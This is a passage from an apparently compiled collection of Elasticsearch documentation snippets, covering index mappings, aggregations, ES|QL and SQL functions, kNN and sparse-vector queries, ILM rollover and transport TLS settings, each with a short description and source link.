\"inference_field\": {\n        \"type\": \"semantic_text\",\n        \"inference_id\": \"my-elser-endpoint-for-ingest\",\n        \"search_inference_id\": \"my-elser-endpoint-for-search\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Multiple Analyzers for a Field in Elasticsearch\nDESCRIPTION: This snippet shows how to create an index with a text field that uses multiple analyzers. The 'text' field uses the standard analyzer, while 'text.english' uses the English analyzer for stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/multi-fields.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"text\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"english\": {\n            \"type\":     \"text\",\n            \"analyzer\": \"english\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Truncating Dates and Times in SQL\nDESCRIPTION: The DATE_TRUNC/DATETRUNC function truncates a date, datetime, or interval to the specified unit. It sets all fields less significant than the specified unit to zero (or one for day, day of week, and month).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_49\n\nLANGUAGE: sql\nCODE:\n```\nDATE_TRUNC(\n    string_exp, <1>\n    datetime_exp/interval_exp) <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DATE_TRUNC('millennium', '2019-09-04T11:22:33.123Z'::datetime) AS millennium;\n\n      millennium\n------------------------\n2000-01-01T00:00:00.000Z\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DATETRUNC('week', '2019-08-24T11:22:33.123Z'::datetime) AS week;\n\n      week\n------------------------\n2019-08-19T00:00:00.000Z\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DATE_TRUNC('centuries', INTERVAL '199-5' YEAR TO MONTH) AS centuries;\n\n      centuries\n------------------\n +100-0\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DATE_TRUNC('days', INTERVAL '19 15:24:19' DAY TO SECONDS) AS day;\n\n      day\n------------------\n+19 00:00:00\n```\n\n----------------------------------------\n\nTITLE: Querying with Children Aggregation in Elasticsearch\nDESCRIPTION: This snippet shows how to use the Children aggregation to connect parent (question) and child (answer) documents, aggregating top tags and answer owners.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-children-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST child_example/_search?size=0\n{\n  \"aggs\": {\n    \"top-tags\": {\n      \"terms\": {\n        \"field\": \"tags.keyword\",\n        \"size\": 10\n      },\n      \"aggs\": {\n        \"to-answers\": {\n          \"children\": {\n            \"type\" : \"answer\"\n          },\n          \"aggs\": {\n            \"top-names\": {\n              \"terms\": {\n                \"field\": \"owner.display_name.keyword\",\n                \"size\": 10\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Text Field Mapping in Elasticsearch\nDESCRIPTION: Example of creating an index with a simple text field mapping for full-text analysis. This defines a field called 'full_name' as type 'text', which will be analyzed using the default analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/text.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"full_name\": {\n        \"type\":  \"text\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic ROW Command Syntax in ESQL\nDESCRIPTION: Shows the basic syntax for creating a row with custom columns and values using the ROW command. Allows specification of multiple column-value pairs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/row.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW column1 = value1[, ..., columnN = valueN]\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Synthetic Source for Long Range Field\nDESCRIPTION: This snippet demonstrates creating an index with synthetic _source enabled and a long_range field. It shows how ranges are sorted and deduplicated in the synthetic source output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/range.md#2025-04-22_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"my_range\": { \"type\": \"long_range\" }\n    }\n  }\n}\n\nPUT idx/_doc/1\n{\n  \"my_range\": [\n    {\n        \"gte\": 200,\n        \"lte\": 300\n    },\n    {\n        \"gte\": 1,\n        \"lte\": 100\n    },\n    {\n        \"gte\": 200,\n        \"lte\": 300\n    },\n    {\n        \"gte\": 200,\n        \"lte\": 500\n    }\n  ]\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"my_range\": [\n    {\n        \"gte\": 1,\n        \"lte\": 100\n    },\n    {\n        \"gte\": 200,\n        \"lte\": 300\n    },\n    {\n        \"gte\": 200,\n        \"lte\": 500\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Multi-Field Mapping for Text Fields in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a mapping with both a text field for full-text searches and a keyword field for aggregations. This is the recommended approach instead of enabling fielddata on text fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/text.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_field\": { \n        \"type\": \"text\",\n        \"fields\": {\n          \"keyword\": { \n            \"type\": \"keyword\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules: INNER JOIN Query\nDESCRIPTION: Sync rules performing an INNER JOIN between employee and customer tables based on matching emp_id and c_id, syncing combined data to Elasticsearch\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-ms-sql.md#2025-04-21_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"tables\": [\"employee\", \"customer\"],\n    \"query\": \"SELECT * FROM employee INNER JOIN customer ON employee.emp_id = customer.c_id\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: DATE_FORMAT Syntax\nDESCRIPTION: Defines the syntax for the DATE_FORMAT function in Elasticsearch SQL. This function formats a date, datetime, or time expression into a string based on a specified format pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_35\n\nLANGUAGE: sql\nCODE:\n```\n\"DATE_FORMAT(\n    date_exp/datetime_exp/time_exp, <1>\n    string_exp) <2>\"\n```\n\n----------------------------------------\n\nTITLE: Transport TLS Core Settings Configuration\nDESCRIPTION: Core TLS/SSL settings for enabling secure transport communication between nodes, including protocol versions and authentication modes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_26\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.transport.ssl.enabled=false\nxpack.security.transport.ssl.supported_protocols=TLSv1.3,TLSv1.2,TLSv1.1\nxpack.security.transport.ssl.client_authentication=required\nxpack.security.transport.ssl.verification_mode=full\n```\n\n----------------------------------------\n\nTITLE: Character Distribution Analysis in String Stats\nDESCRIPTION: Shows how to retrieve character probability distribution alongside standard string statistics by enabling the show_distribution parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-string-stats-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_search?size=0\n{\n  \"aggs\": {\n    \"message_stats\": {\n      \"string_stats\": {\n        \"field\": \"message.keyword\",\n        \"show_distribution\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Boxplot Aggregation with Missing Value Handling in Elasticsearch\nDESCRIPTION: This example illustrates how to use the missing parameter in a boxplot aggregation to specify a default value for documents missing the aggregated field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-boxplot-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"grade_boxplot\": {\n      \"boxplot\": {\n        \"field\": \"grade\",\n        \"missing\": 10\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing ELSER Query with Pruning Configuration and Rescore in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to execute a sparse vector query using an ELSER model with token pruning to improve performance. It includes a rescore function to mitigate shard-level inconsistencies with pruned tokens. The query searches for 'How is the weather in Jamaica?' in a field containing sparse vector tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-sparse-vector-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET my-index/_search\n{\n   \"query\":{\n      \"sparse_vector\":{\n         \"field\": \"ml.tokens\",\n         \"inference_id\": \"my-elser-model\",\n         \"query\":\"How is the weather in Jamaica?\",\n         \"prune\": true,\n         \"pruning_config\": {\n           \"tokens_freq_ratio_threshold\": 5,\n           \"tokens_weight_threshold\": 0.4,\n           \"only_score_pruned_tokens\": false\n         }\n      }\n   },\n   \"rescore\": {\n      \"window_size\": 100,\n      \"query\": {\n         \"rescore_query\": {\n            \"sparse_vector\": {\n               \"field\": \"ml.tokens\",\n               \"inference_id\": \"my-elser-model\",\n               \"query\": \"How is the weather in Jamaica?\",\n               \"prune\": true,\n               \"pruning_config\": {\n                   \"tokens_freq_ratio_threshold\": 5,\n                   \"tokens_weight_threshold\": 0.4,\n                   \"only_score_pruned_tokens\": true\n               }\n            }\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Prefix Query in Elasticsearch\nDESCRIPTION: This example illustrates how to execute a prefix query that searches for documents where the 'user.id' field starts with 'ki'. The 'GET' request specifies the query structure to filter results based on prefix matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-prefix-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"prefix\": {\n      \"user.id\": {\n        \"value\": \"ki\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting ignore_malformed at Index Level in Elasticsearch\nDESCRIPTION: This snippet shows how to set the ignore_malformed parameter at the index level in Elasticsearch. It demonstrates how to override the index-level setting for specific fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/ignore-malformed.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"index.mapping.ignore_malformed\": true\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"number_one\": {\n        \"type\": \"byte\"\n      },\n      \"number_two\": {\n        \"type\": \"integer\",\n        \"ignore_malformed\": false\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Multiple Values with STATS in ESQL\nDESCRIPTION: Illustrates how to calculate multiple aggregated values using the STATS command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\nSTATS\n  avg_salary = AVG(salary),\n  min_salary = MIN(salary),\n  max_salary = MAX(salary)\nBY department;\n```\n\n----------------------------------------\n\nTITLE: Implementing Hungarian Analyzer in Elasticsearch\nDESCRIPTION: Custom implementation of the built-in Hungarian analyzer with Hungarian stopwords, keyword marker for exclusions from stemming, and Hungarian stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_19\n\nLANGUAGE: console\nCODE:\n```\nPUT /hungarian_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"hungarian_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_hungarian_\" <1>\n        },\n        \"hungarian_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"példa\"] <2>\n        },\n        \"hungarian_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"hungarian\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_hungarian\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"hungarian_stop\",\n            \"hungarian_keywords\",\n            \"hungarian_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Doc Values in Elasticsearch Search\nDESCRIPTION: Example of using the docvalue_fields parameter to efficiently retrieve specific fields' values from the column-based doc values storage rather than from _source, including formatting options for date fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  },\n  \"docvalue_fields\": [\n    \"user.id\",\n    \"http.response.*\", <1>\n    {\n      \"field\": \"date\",\n      \"format\": \"epoch_millis\" <2>\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types for ESQL Function in Markdown\nDESCRIPTION: This markdown table defines the supported input field types and their corresponding result types for an ESQL function. It covers both cartesian and geographic data types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/st_extent_agg.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| cartesian_point | cartesian_shape |\n| cartesian_shape | cartesian_shape |\n| geo_point | geo_shape |\n| geo_shape | geo_shape |\n```\n\n----------------------------------------\n\nTITLE: ESQL Ceiling Function Description\nDESCRIPTION: Documentation note explaining the ceiling function behavior across different numeric types. For long and integer types it performs no operation, while for double values it finds the nearest double value to the integer similar to Java's Math.ceil function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/ceil.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nRound a number up to the nearest integer.\n\n::::{note}\nThis is a noop for `long` (including unsigned) and `integer`. For `double` this picks the closest `double` value to the integer similar to [Math.ceil](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/Math.html#ceil(double)).\n::::\n```\n\n----------------------------------------\n\nTITLE: Date Histogram Value Source Example\nDESCRIPTION: Shows how to use the date_histogram value source with a calendar interval. This example creates daily buckets from a timestamp field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          { \"date\": { \"date_histogram\": { \"field\": \"timestamp\", \"calendar_interval\": \"1d\" } } }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an index with token_count field in Elasticsearch\nDESCRIPTION: This example demonstrates creating an index with a text field that includes a token_count multi-field to count tokens. The example shows indexing documents and searching by token count.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/token-count.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"name\": { <1>\n        \"type\": \"text\",\n        \"fields\": {\n          \"length\": { <2>\n            \"type\":     \"token_count\",\n            \"analyzer\": \"standard\"\n          }\n        }\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{ \"name\": \"John Smith\" }\n\nPUT my-index-000001/_doc/2\n{ \"name\": \"Rachel Alice Williams\" }\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"term\": {\n      \"name.length\": 3 <3>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Multiple Percentiles with ESQL\nDESCRIPTION: Demonstrates how to calculate multiple percentiles (0th, 50th, and 99th) of the salary column using the PERCENTILE function in a single query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/percentile.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS p0 = PERCENTILE(salary,  0)\n     , p50 = PERCENTILE(salary, 50)\n     , p99 = PERCENTILE(salary, 99)\n```\n\n----------------------------------------\n\nTITLE: Sorted Result of Synthetic Source for date_nanos Field in Elasticsearch\nDESCRIPTION: The result of using synthetic source with a date_nanos field, showing how the values are automatically sorted.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/date_nanos.md#2025-04-21_snippet_3\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"date\": [\"2014-01-01T12:10:30.000Z\", \"2015-01-01T12:10:30.000Z\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Excluding Node from Shard Allocation in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use cluster-level shard allocation filtering to exclude a specific node from shard allocation based on its IP address. This is commonly used when decommissioning a node.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/cluster-level-shard-allocation-routing-settings.md#2025-04-21_snippet_6\n\nLANGUAGE: json\nCODE:\n```\nPUT _cluster/settings\n{\n  \"persistent\" : {\n    \"cluster.routing.allocation.exclude._ip\" : \"10.0.0.1\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Combined Fields Query Term-Centric Execution Example\nDESCRIPTION: Shows how the combined_fields query is internally executed with a term-centric approach across specified fields\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-combined-fields-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"combined_fields\" : {\n      \"query\":      \"database systems\",\n      \"fields\":     [ \"title\", \"abstract\"],\n      \"operator\":   \"and\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Pipeline with Date Index Name Processor in Elasticsearch\nDESCRIPTION: Example of creating an ingest pipeline that uses the date_index_name processor to direct documents to monthly indices with a 'my-index-' prefix based on a date field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/date-index-name-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/monthlyindex\n{\n  \"description\": \"monthly date-time index naming\",\n  \"processors\" : [\n    {\n      \"date_index_name\" : {\n        \"field\" : \"date1\",\n        \"index_name_prefix\" : \"my-index-\",\n        \"date_rounding\" : \"M\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: kNN Query with Pre-filters in Elasticsearch\nDESCRIPTION: Demonstrates how to apply pre-filtering in a kNN query to restrict results to documents with specific characteristics. It shows the use of `knn` query along with a `term` filter which limits matched documents by a specified file type. The inputs are query parameters, and the outputs are filtered query results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-knn-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST my-image-index/_search\n{\n  \"size\" : 10,\n  \"query\" : {\n    \"bool\" : {\n      \"must\" : {\n        \"knn\": {\n          \"field\": \"image-vector\",\n          \"query_vector\": [-5, 9, -12],\n          \"k\": 3\n        }\n      },\n      \"filter\" : {\n        \"term\" : { \"file-type\" : \"png\" }\n      }\n    }\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Email Account in Elasticsearch YAML\nDESCRIPTION: Sets the default email account to use when multiple email accounts are configured. This setting is dynamic and can be updated without restarting Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.notification.email.default_account\n```\n\n----------------------------------------\n\nTITLE: ES|QL Escaped Quoted Identifiers\nDESCRIPTION: Demonstrates how to escape backticks when referencing a function alias with quoted identifiers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-syntax.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nFROM index\n| STATS COUNT(`1.field`)\n| EVAL my_count = `COUNT(``1.field``)`\n```\n\n----------------------------------------\n\nTITLE: Parameterized Time Spans with BUCKET Function in ESQL\nDESCRIPTION: Demonstrates using parameterized time spans with the BUCKET function for grouping data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-time-spans.md#2025-04-21_snippet_4\n\nLANGUAGE: esql\nCODE:\n```\nPOST /_query\n{\n   \"query\": \"\"\"\n   FROM employees\n   | WHERE hire_date >= \"1985-01-01T00:00:00Z\" AND hire_date < \"1986-01-01T00:00:00Z\"\n   | STATS hires_per_week = COUNT(*) BY week = BUCKET(hire_date, ?timespan)\n   | SORT week\n   \"\"\",\n   \"params\": [{\"timespan\" : \"1 week\"}]\n}\n```\n\n----------------------------------------\n\nTITLE: Basic WHERE Syntax in ESQL\nDESCRIPTION: The fundamental syntax for the WHERE command in ESQL that filters rows based on a boolean expression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/where.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nWHERE expression\n```\n\n----------------------------------------\n\nTITLE: Basic DISSECT Pattern Example\nDESCRIPTION: Demonstrates a simple DISSECT pattern format for parsing log lines containing IP, timestamp and status\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_0\n\nLANGUAGE: txt\nCODE:\n```\n%{clientip} [%{@timestamp}] %{status}\n```\n\n----------------------------------------\n\nTITLE: Documenting VersionScriptDocValues class\nDESCRIPTION: This snippet documents the `VersionScriptDocValues` class, which likely provides access to version data within a script. It includes a `get(int)` method to retrieve a string based on an integer index and `getValue()` to directly retrieve the string value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/mapper-version/src/main/resources/org/elasticsearch/xpack/versionfield/org.elasticsearch.xpack.versionfield.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.versionfield.VersionScriptDocValues {\n    String get(int)\n    String getValue()\n}\n```\n\n----------------------------------------\n\nTITLE: Adding CJK Bigram Filter to a Custom Analyzer in Elasticsearch\nDESCRIPTION: This example shows how to configure a new custom analyzer using the CJK bigram token filter through the create index API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-cjk-bigram-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /cjk_bigram_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_cjk_bigram\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"cjk_bigram\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Synonyms in Match Query\nDESCRIPTION: This snippet illustrates how to configure a match query to handle multi-term synonyms without automatically generating phrase queries. It demonstrates a more complex boolean query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n   \"query\": {\n       \"match\" : {\n           \"message\": {\n               \"query\" : \"ny city\",\n               \"auto_generate_synonyms_phrase_query\" : false\n           }\n       }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Geohash Grid Aggregation with Bounding Box in Elasticsearch\nDESCRIPTION: This example shows how to use the bounds parameter in a geohash_grid aggregation to restrict the cells considered to those that intersect with the specified bounding box.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geohashgrid-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggregations\": {\n    \"tiles-in-bounds\": {\n      \"geohash_grid\": {\n        \"field\": \"location\",\n        \"precision\": 8,\n        \"bounds\": {\n          \"top_left\": \"POINT (4.21875 53.4375)\",\n          \"bottom_right\": \"POINT (5.625 52.03125)\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Runtime Fields with Max Aggregation in Elasticsearch\nDESCRIPTION: This example shows how to use a runtime field with the Max aggregation to calculate the maximum of a complex value. It applies a discount to promoted items before finding the maximum price.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-max-aggregation.md#2025-04-22_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"price.adjusted\": {\n      \"type\": \"double\",\n      \"script\": \"\"\"\n        double price = doc['price'].value;\n        if (doc['promoted'].value) {\n          price *= 0.8;\n        }\n        emit(price);\n      \"\"\"\n    }\n  },\n  \"aggs\": {\n    \"max_price\": {\n      \"max\": { \"field\": \"price.adjusted\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Rollover Based on Document Count\nDESCRIPTION: ILM policy configuration that triggers rollover when the index contains 100 million documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-rollover.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"actions\": {\n          \"rollover\" : {\n            \"max_docs\": 100000000\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Elasticsearch Search with Profiling and Aggregations\nDESCRIPTION: This snippet demonstrates how to perform a search query in Elasticsearch with profiling enabled, including term query, aggregations, and post-filter. It showcases the use of scoped and global aggregations on the 'http.response.status_code' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"profile\": true,\n  \"query\": {\n    \"term\": {\n      \"user.id\": {\n        \"value\": \"elkbee\"\n      }\n    }\n  },\n  \"aggs\": {\n    \"my_scoped_agg\": {\n      \"terms\": {\n        \"field\": \"http.response.status_code\"\n      }\n    },\n    \"my_global_agg\": {\n      \"global\": {},\n      \"aggs\": {\n        \"my_level_agg\": {\n          \"terms\": {\n            \"field\": \"http.response.status_code\"\n          }\n        }\n      }\n    }\n  },\n  \"post_filter\": {\n    \"match\": {\n      \"message\": \"search\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing bit vectors using bulk API in Elasticsearch\nDESCRIPTION: Demonstrates inserting bit vector data into Elasticsearch using the _bulk API. The example shows two different ways to represent the same 40-bit vector: as an array of 5 bytes or as a hexadecimal string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-bit-vectors/_bulk?refresh\n{\"index\": {\"_id\" : \"1\"}}\n{\"my_vector\": [127, -127, 0, 1, 42]}\n{\"index\": {\"_id\" : \"2\"}}\n{\"my_vector\": \"8100012a7f\"}\n```\n\n----------------------------------------\n\nTITLE: Defining and Using Point Type in Elasticsearch\nDESCRIPTION: This example demonstrates how to define a mapping with a point field type and five different ways to index points: using GeoJSON format, Well-Known Text (WKT), object with x/y keys, array format, and string format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/point.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"point\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"text\": \"Point as an object using GeoJSON format\",\n  \"location\": { \n    \"type\": \"Point\",\n    \"coordinates\": [-71.34, 41.12]\n  }\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"text\": \"Point as a WKT POINT primitive\",\n  \"location\" : \"POINT (-71.34 41.12)\" \n}\n\nPUT my-index-000001/_doc/3\n{\n  \"text\": \"Point as an object with 'x' and 'y' keys\",\n  \"location\": { \n    \"x\": -71.34,\n    \"y\": 41.12\n  }\n}\n\nPUT my-index-000001/_doc/4\n{\n  \"text\": \"Point as an array\",\n  \"location\": [ -71.34, 41.12 ] \n}\n\nPUT my-index-000001/_doc/5\n{\n  \"text\": \"Point as a string\",\n  \"location\": \"-71.34,41.12\" \n}\n```\n\n----------------------------------------\n\nTITLE: Understanding DATE_DIFF with year units in ESQL\nDESCRIPTION: This example illustrates how DATE_DIFF works with calendar units like years, showing that only fully elapsed units are counted. It compares dates at the end of 2023 and throughout 2024 to 